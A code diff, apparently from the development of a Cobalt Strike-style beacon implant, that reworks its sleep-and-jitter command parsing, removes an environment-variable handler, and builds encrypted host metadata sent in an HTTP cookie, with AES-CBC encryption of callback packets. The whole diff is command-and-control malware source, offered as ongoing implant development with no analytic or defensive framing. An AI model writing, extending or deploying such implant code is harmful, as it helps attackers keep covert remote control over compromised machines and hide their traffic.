@@ -7,38 +7,19 @@
 
 extern int SleepTime;
 extern int Counter;
-extern unsigned char AESRandaeskey[16];
+extern unsigned char aeskey[16];
 extern int clientID;
 
-VOID CmdChangSleepTimes(unsigned char* commandBuf) {
-    uint8_t buffer[4];
-    memcpy(buffer, commandBuf, 4);
-    uint32_t sleep = bigEndianUint32(buffer);
-    SleepTime = sleep;
-}
+VOID CmdChangSleepTimes(unsigned char* commandBuf, size_t commandBuflen) {
+    datap parser;
+    BeaconDataParse(&parser, commandBuf, commandBuflen);
 
-// 是对当前进程的环境变量
-unsigned char* CmdSetEnv(unsigned char* commandBuf, size_t commandBuflen, size_t* msgLen) {
-    // 返回 0 表示成功
-    if (putenv(commandBuf)) {
-        fprintf(stderr, "putenv failed\n");
-        *msgLen = 0;
-        return NULL;
-    }
-    // DEBUG：
-    fprintf(stdout, "Beacon = %s\n", getenv("Beacon"));
-    unsigned char* envStr = "[+] setenv success: ";
-    unsigned char* postMsg = malloc(strlen(envStr) + commandBuflen + 1);
-    if (!postMsg) {
-        fprintf(stderr, "Memory allocation failed\n");
-        *msgLen = 0;
-        return NULL;
-    }
-    snprintf(postMsg, strlen(envStr) + commandBuflen + 1, "%s%s", envStr, commandBuf);
-    *msgLen = strlen(envStr) + commandBuflen;
-    return postMsg;
+    SleepTime = BeaconDataInt(&parser);
+	jitter = BeaconDataInt(&parser);
+    if (jitter <= 0 || jitter > 99)
+        jitter = 0;
+	jitter = (SleepTime * jitter) / 100;
 }
-
 
 VOID FreeEncryptMetadataResult(EncryptMetadataResult* r) {
     if (r && r->EncryptMetaData) {
@@ -51,7 +32,7 @@ VOID FreeEncryptMetadataResult(EncryptMetadataResult* r) {
 wchar_t* makeMetaData() {
     EncryptMetadataResult EncryptMetaInfos = EncryMetadata();
     unsigned char* EncryptMetaInfo = EncryptMetaInfos.EncryptMetaData;
-    int EncryptMetaInfolen = EncryptMetaInfos.EncryptMetaDataLen;
+    size_t EncryptMetaInfolen = EncryptMetaInfos.EncryptMetaDataLen;
 
     if (!EncryptMetaInfo || EncryptMetaInfolen <= 0) {
         fprintf(stderr, "EncryMetadata failed\n");
@@ -69,7 +50,7 @@ wchar_t* makeMetaData() {
 
     unsigned char* headerStart = (unsigned char*)malloc(headers_length + 1);
     if (!headerStart) {
-        fprintf(stderr, "Memory allocation failed for headerStart\n");
+        fprintf(stderr, "Memory allocation failed\n");
         free(baseEncodeMetadata);
         return NULL;
     }
@@ -81,14 +62,14 @@ wchar_t* makeMetaData() {
     size_t cookieLen = strlen(headerStart) + strlen(baseEncodeMetadata);
     unsigned char* cookieStr = (unsigned char*)malloc(cookieLen + 1);
     if (!cookieStr) {
-        fprintf(stderr, "Memory allocation failed for cookieStr\n");
+        fprintf(stderr, "Memory allocation failed\n");
         free(headerStart);
         free(baseEncodeMetadata);
         return NULL;
     }
 
-    strcpy((char*)cookieStr, (char*)headerStart);
-    strcat((char*)cookieStr, (char*)baseEncodeMetadata);
+    snprintf((char*)cookieStr, cookieLen + 1, "%s%s", headerStart, baseEncodeMetadata);
+
 
 	free(headerStart);
 	free(baseEncodeMetadata);
@@ -96,7 +77,7 @@ wchar_t* makeMetaData() {
     // 先计算宽字符长度（包含结尾 \0）
     int wideLen = MultiByteToWideChar(CP_ACP, 0, (char*)cookieStr, -1, NULL, 0);
     if (wideLen == 0) {
-        fprintf(stderr, "MultiByteToWideChar Failed With Error：%lu\n", GetLastError());
+        fprintf(stderr, "MultiByteToWideChar failed with error:%lu\n\n", GetLastError());
         free(cookieStr);
         return NULL;
     }
@@ -104,13 +85,13 @@ wchar_t* makeMetaData() {
     // 分配 wideLen（字符串 + 末尾\0）+ 2（\r \n）+ 1（新的\0）
     wchar_t* wCookieStr = (wchar_t*)malloc((wideLen + 2) * sizeof(wchar_t));
     if (!wCookieStr) {
-        fprintf(stderr, "Memory allocation failed for wCookieStr\n");
+        fprintf(stderr, "Memory allocation failed\n");
         free(cookieStr);
         return NULL;
     }
 
-    if (MultiByteToWideChar(CP_ACP, 0, (char*)cookieStr, -1, wCookieStr, wideLen) == 0) {
-        fprintf(stderr, "MultiByteToWideChar Failed With Error:%lu\n", GetLastError());
+    if (MultiByteToWideChar(CP_ACP, 0, (unsigned char*)cookieStr, -1, wCookieStr, wideLen) == 0) {
+        fprintf(stderr, "MultiByteToWideChar failed with error:%lu\n\n", GetLastError());
         free(cookieStr);
         free(wCookieStr);
         return NULL;
@@ -194,7 +175,7 @@ unsigned char* MakePacket(int callback, unsigned char* postMsg, size_t msgLen, s
 
     // AES CBC 加密
     size_t decryptAES_CBCdatalen;
-    unsigned char* EncryptAES_CBCdata = AesCBCEncrypt(buf, AESRandaeskey, buf_length, &decryptAES_CBCdatalen);
+    unsigned char* EncryptAES_CBCdata = AesCBCEncrypt(buf, aeskey, buf_length, &decryptAES_CBCdatalen);
     free(buf);
 
     if (!EncryptAES_CBCdata) {
